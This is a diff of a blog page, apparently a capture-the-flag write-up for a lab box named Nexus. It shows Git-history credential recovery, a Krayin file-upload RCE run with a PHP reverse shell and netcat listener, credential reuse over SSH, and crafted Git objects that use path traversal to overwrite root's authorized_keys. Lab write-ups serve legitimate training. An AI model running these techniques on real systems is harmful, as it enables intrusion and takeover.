@@ -135,10 +135,10 @@ footer .container { display: flex; align-items: center; justify-content: space-b
 <div class="content">
 
 <h2>Overview</h2>
-<p>Nexus was an easy Linux box. Vhost enumeration turned up a Gitea instance and a Krayin CRM billing portal. Recovered a leaked <code>.env</code> credential from Git history, reused it to log into Krayin, and Krayin turned out to be vulnerable to an authenticated file-upload RCE. From there, LinPEAS handed over another set of creds that got reused over SSH, and a root-owned systemd timer syncing Gitea templates was the final piece: hand-crafted some Git objects to smuggle a path traversal payload into root's <code>authorized_keys</code>.</p>
+<p>Nexus is an easy Linux box. Vhost enumeration turned up a Gitea instance and a Krayin CRM billing portal. I recovered a leaked <code>.env</code> credential from Git history, reused it to log into Krayin, and exploited an authenticated file-upload RCE in Krayin. LinPEAS then found another set of credentials that worked over SSH. The last step was a root-owned systemd timer that syncs Gitea templates. I hand-built Git objects to slip a path traversal payload into root's <code>authorized_keys</code>.</p>
 
 <h2>Recon</h2>
-<p>Started with a service/default NSE script nmap scan, as with any box.</p>
+<p>I started with an nmap scan using service detection and the default NSE scripts.</p>
 <pre><code>nmap -sC -sV 10.129.89.114</code></pre>
 <pre><code>PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
@@ -146,60 +146,60 @@ footer .container { display: flex; align-items: center; justify-content: space-b
 |_http-title: Gitea: Git with a cup of tea
 |_http-server-header: nginx/1.24.0 (Ubuntu)</code></pre>
 <img src="https://i.imgur.com/y4O1RaR.png" alt="Nmap scan showing SSH and an nginx-fronted Gitea instance" />
-<p>Then searched on searchsploit for nginx and OpenSSH, but nothing was available. Decided to review the website.</p>
+<p>searchsploit had nothing for these nginx and OpenSSH versions, so I moved on to the website.</p>
 <img src="https://i.imgur.com/zuPbGfQ.png" alt="Nexus Energy Authority Landing page" />
 
 <h2>Enumeration</h2>
-<p>Nothing seemed of interest on the site, with the exception of this particular email: <code>j.matthew@nexus.htb</code>. It looked useful and could be used for later.</p>
+<p>The site had nothing interesting except one email address, <code>j.matthew@nexus.htb</code>, which I saved for later.</p>
 <img src="https://i.imgur.com/0lkaqdg.png" alt="Nexus Energy Authority landing section with the leaked staff email" />
-<p>After running a gobuster vhost brute force, got some further useful findings. Added the domains to <code>/etc/hosts</code>.</p>
+<p>A gobuster vhost brute force found two more subdomains, which I added to <code>/etc/hosts</code>.</p>
 <pre><code>gobuster vhost -u nexus.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain</code></pre>
 <img src="https://i.imgur.com/lv1UVUZ.png" alt="Gobuster vhost results revealing git.nexus.htb and billing.nexus.htb" />
-<p>Billing then takes us to this admin login portal, Krayin, an open-source CRM.</p>
+<p>The billing subdomain hosts an admin login portal for Krayin, an open-source CRM.</p>
 <img src="https://i.imgur.com/cpf0ELK.png" alt="the Krayin admin login portal" />
 
 
-<p>Git page takes us to a git service. found there was a link to a git repo.</p>
+<p>The git subdomain hosts a Gitea instance with a public repo, <code>krayin-docker-setup</code>.</p>
 <img src="https://i.imgur.com/Nl3yEPS.png" alt="admin's public krayin-docker-setup repository on Gitea" />
-<p>Upon inspection, some credentials were found, but not anything particularly of interest: the <code>DB_PASSWORD</code> field was blank. Decided to git clone it to see if we could retrieve any credentials that might have previously been in the git repo.</p>
+<p>The repo's config had a <code>DB_PASSWORD</code> field, but it was blank. I cloned the repo to check whether an earlier commit had held a real password.</p>
 <pre><code>git clone http://git.nexus.htb/admin/krayin-docker-setup
 cd krayin-docker-setup
 git log --all -p | grep -i "password\|api_key\|secret\|token"</code></pre>
 <img src="https://i.imgur.com/NI49iUl.png" alt="Grepping through git log -p output and finding the old password" />
-<p>Credentials were found!</p>
+<p>An earlier commit had the password.</p>
 <pre><code>-DB_PASSWORD=N27xh!!2ucY04
 +DB_PASSWORD=</code></pre>
 
 <h2>Foothold</h2>
-<p>Decided to use the same password using the <code>j.matthew@nexus.htb</code> account.</p>
+<p>I tried that password with the <code>j.matthew@nexus.htb</code> account.</p>
 <img src="https://i.imgur.com/2QfMsJ3.png" alt="Logging into Krayin and landing on the dashboard" />
-<p>Credentials worked!</p>
+<p>It worked.</p>
  <img src="https://i.imgur.com/vbysExG.png" alt="Krayin dashboard"/> 
-<p>Upon searching the version of Krayin, it seems this version had a CVE: <strong>CVE-2026-38526 / EDB-ID 52629</strong>, an authenticated RCE. Krayin uses TinyMCE for rich-text fields, and TinyMCE's in-editor image upload hits a server-side endpoint meant to accept only images. The file-type validation on that endpoint isn't strict enough to block a <code>.php</code> upload, and uploaded files land directly under the web-accessible <code>storage/tinymce/</code> directory, so any authenticated user can upload a PHP web shell through what's meant to be an image uploader, then just browse to the returned path to get code execution.</p>
-<p>From here, downloaded the python POC and ran it against the billing subdomain with the payload being a PHP reverse shell by Pentest Monkey.</p>
+<p>Searching for this Krayin version turned up <strong>CVE-2026-38526 / EDB-ID 52629</strong>, an authenticated RCE. Krayin uses TinyMCE for rich-text fields, and TinyMCE's in-editor image upload hits a server-side endpoint meant to accept only images. The file-type validation on that endpoint isn't strict enough to block a <code>.php</code> upload, and uploaded files land directly under the web-accessible <code>storage/tinymce/</code> directory. Any authenticated user can upload a PHP web shell through the image uploader and then browse to the returned path to run it.</p>
+<p>I downloaded the Python PoC and ran it against the billing subdomain with Pentest Monkey's PHP reverse shell as the payload.</p>
 <pre><code>python3 52629.py -t http://billing.nexus.htb -u j.matthew@nexus.htb -p 'N27xh!!2ucY04' -f php-reverse-shell.php
 
 nc -lvnp 4444</code></pre>
 <img src="https://i.imgur.com/twgMfS7.png" alt="Running the Krayin CVE PoC" />
-<p>After running the POC, clicked on the link produced by it which then led to our netcat session being opened!</p>
+<p>The PoC printed a link to the uploaded file. Opening it connected the reverse shell to my netcat listener.</p>
 <img src="https://i.imgur.com/CrB5r7Y.png" alt="catching a www-data reverse shell" />
-<p>Got a shell as <code>www-data</code>.</p>
+<p>That gave me a shell as <code>www-data</code>.</p>
 
-<h2>Privilege Escalation</h2>
-<p>Then decided to run linpeas.</p>
+<h2>Privilege escalation</h2>
+<p>Next I ran LinPEAS.</p>
 <img src="https://i.imgur.com/pZMg8GX.png" alt="LinPEAS running on the target as www-data" />
 <img src="https://i.imgur.com/PyEsPIs.png" alt="LinPEAS returning credentials" />
 
-<p>Linpeas returned credentials. Tried sshing with those credentials for the <code>krayin</code> user, but had no luck, so let's try <code>jones</code>.</p>
+<p>LinPEAS found credentials. They didn't work over SSH for the <code>krayin</code> user, so I tried <code>jones</code>.</p>
 <pre><code>ssh jones@10.129.89.28
 cat user.txt
 8a3fdb05504c0a99754de6b9dee757e0</code></pre>
 <img src="https://i.imgur.com/4F9VZcK.png" alt="SSH login as jones and reading the user flag" />
-<p>It worked with jones! Here we get our user flag.</p>
+<p>They worked for jones, and the user flag was in the home directory.</p>
 
-<p>Upon taking a look at the previous linpeas output again, this service seemed interesting and could possibly give us the privilege escalation we need: a systemd timer, <code>gitea-template-sync.timer</code>, running <code>/etc/gitea/template-sync.py</code> as <strong>root</strong>. The script walks any Gitea repo flagged <code>template:true</code> and copies its tracked files into a staging directory.</p>
+<p>Going back through the LinPEAS output, one service stood out as a privilege escalation candidate: a systemd timer, <code>gitea-template-sync.timer</code>, running <code>/etc/gitea/template-sync.py</code> as <strong>root</strong>. The script walks any Gitea repo flagged <code>template:true</code> and copies its tracked files into a staging directory.</p>
 <img src="https://i.imgur.com/SZXsS6n.png" alt="Discovering the root-owned gitea-template-sync systemd timer" />
-<p>Below is the vulnerable code:</p>
+<p>Here is the vulnerable script:</p>
 <div class="code-clamp">
 <input type="checkbox" id="code-1" class="code-toggle-checkbox">
 <div class="code-scroll">
@@ -350,10 +350,10 @@ if __name__ == '__main__':
 </div>
 <label for="code-1" class="toggle-line"><span class="chevron">▸</span><span class="label-more">Show 139 more lines</span><span class="label-less">Show less</span></label>
 </div>
-<p><code>filepath</code> comes straight from <code>git ls-tree</code> with zero sanitization, then flows into <code>os.path.join(stage_path, filepath)</code>, which happily walks <code>..</code> sequences right out of the staging directory. A tree entry literally named <code>../../../../../root/.ssh/authorized_keys</code> gets written to the real path and since the script runs as root, the write goes through.</p>
-<p>Normally you couldn't get away with this as the standard <code>git</code> client refuses to let a tree entry contain <code>..</code>. <code>git add</code>, <code>git commit</code>, even <code>git update-index --cacheinfo</code>, all validate and reject it. The way around it is to skip the Git client entirely and hand-build the raw blob/tree/commit objects directly, since nothing at that layer checks path safety, only the porcelain commands do.</p>
+<p><code>filepath</code> comes straight from <code>git ls-tree</code> with zero sanitization, then flows into <code>os.path.join(stage_path, filepath)</code>, which follows <code>..</code> sequences out of the staging directory. A tree entry named <code>../../../../../root/.ssh/authorized_keys</code> gets written to that real path, and since the script runs as root, the write succeeds.</p>
+<p>The standard <code>git</code> client blocks this by refusing tree entries that contain <code>..</code>. <code>git add</code>, <code>git commit</code>, and even <code>git update-index --cacheinfo</code> all reject it. The workaround is to skip the Git client and build the raw blob, tree, and commit objects by hand. Only the porcelain commands check path safety, so nothing at the object layer stops it.</p>
 
-<p>We then create an SSH key and make a API call to gitea to have a token created. We also make the token a variable we'll be using next.</p>
+<p>Next I generated an SSH key and called the Gitea API to create an access token, which I saved in a variable for the next steps.</p>
 <div class="code-clamp">
 <input type="checkbox" id="code-2" class="code-toggle-checkbox">
 <div class="code-scroll">
@@ -369,7 +369,7 @@ curl -X POST http://git.nexus.htb/api/v1/users/jones/tokens \
 </div>
 <img src="https://i.imgur.com/W7wqpAR.png" alt="Generating the SSH key and using the Gitea API to create and template-flag the repo" />
 
-<p>We then make further API calls to create the malicious repo.</p>
+<p>Two more API calls create the malicious repo and flag it as a template.</p>
 <div class="code-clamp">
 <input type="checkbox" id="code-3" class="code-toggle-checkbox">
 <div class="code-scroll">
@@ -387,7 +387,7 @@ curl -X POST http://git.nexus.htb/api/v1/users/jones/tokens \
 <label for="code-3" class="toggle-line"><span class="chevron">▸</span><span class="label-more">Show 5 more lines</span><span class="label-less">Show less</span></label>
 </div>
 
-<p>Created the malicious git repo, then found a script that'll allow for directory traversal: writes blob/tree/commit objects directly into <code>.git/objects/</code>, chains <code>..</code> tree entries around the <code>authorized_keys</code> blob, and manually points <code>refs/heads/main</code> at the crafted commit:</p>
+<p>I then used a script I found that writes blob, tree, and commit objects directly into <code>.git/objects/</code>, nests the <code>authorized_keys</code> blob under chained <code>..</code> tree entries, and points <code>refs/heads/main</code> at the crafted commit:</p>
 
 <div class="code-clamp">
 <input type="checkbox" id="code-4" class="code-toggle-checkbox">
@@ -434,21 +434,21 @@ print("Done: "+sha)</code></pre>
 </div>
 <label for="code-4" class="toggle-line"><span class="chevron">▸</span><span class="label-more">Show 34 more lines</span><span class="label-less">Show less</span></label>
 </div>
-<p>Initializing the local repo and setting the remote before crafting the objects.</p>
+<p>Before running the script, I initialized a local repo and set the remote.</p>
 <img src="https://i.imgur.com/yhcw5bR.png" alt="Initializing the local repo and setting the remote before crafting the objects" />
 <img src="https://i.imgur.com/Wtlta8c.png" alt="setting the remote before crafting the objects" />
 
-<p>Then run <code>git push origin main</code>.</p>
+<p>Then I pushed it with <code>git push origin main</code>.</p>
 <pre><code>git push origin main</code></pre>
-<p>Since the service runs every minute, we'll wait it and then verify once we see <code>synced: ../../../../../root/.ssh/authorized_keys</code> by running <code>tail -f /var/log/template-sync.log</code>.</p>
+<p>The timer runs every minute, so I watched <code>/var/log/template-sync.log</code> with <code>tail -f</code> until it printed <code>synced: ../../../../../root/.ssh/authorized_keys</code>.</p>
 
 <pre><code>[2026-08-16 08:38:42] Syncing template: jones/rce
 [2026-08-16 08:38:42]   synced: README.md
 [2026-08-16 08:38:42]   synced: ../../../../../root/.ssh/authorized_keys
 [2026-08-16 08:38:42] Template sync complete</code></pre>
-<p>It synced! Let's try to SSH into the root user.</p>
+<p>It synced, so I tried SSH as root with the new key.</p>
 <img src="https://i.imgur.com/Y09UdrC.png" alt="Root access obtained" />
-<p>We've gained root access !</p>
+<p>That gave me root access.</p>
 <img src="https://i.imgur.com/7Sp11Ek.png" alt="Root flag obtained" />
 
 <div class="post-nav">
